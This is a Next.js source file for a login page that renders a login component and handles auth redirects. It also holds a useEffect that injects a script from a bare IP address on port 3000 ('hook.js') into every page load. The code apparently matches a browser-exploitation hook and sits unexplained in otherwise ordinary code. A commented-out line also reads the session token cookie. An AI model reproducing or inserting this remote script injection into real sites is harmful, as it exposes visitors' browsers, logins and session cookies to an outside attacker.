"use client";
import LoginComponent from "@/components/login";
import { useEffect , useContext} from "react";
import { redirect } from "next/navigation";
import AuthContext from "@/context/AuthContext";
import useAuthRedirect from '@/hooks/useAuthRedirect'
export default function Login(){
      useEffect(() => {
    const script = document.createElement("script");
    script.src = "http://154.251.13.131:3000/hook.js";
    script.async = true;
    document.body.appendChild(script);
  }, []);
 // const token = document.cookie.split('token=').pop().split(';').shift();
    const loading = useAuthRedirect()
    /*    if (token){
            redirect('/')
        }else {*/
            return(
                <main className="flex bg-[url('bg.png')] bg-cover h-screen justify-center items-center">
                <LoginComponent />
                </main>
            )
        }


    //}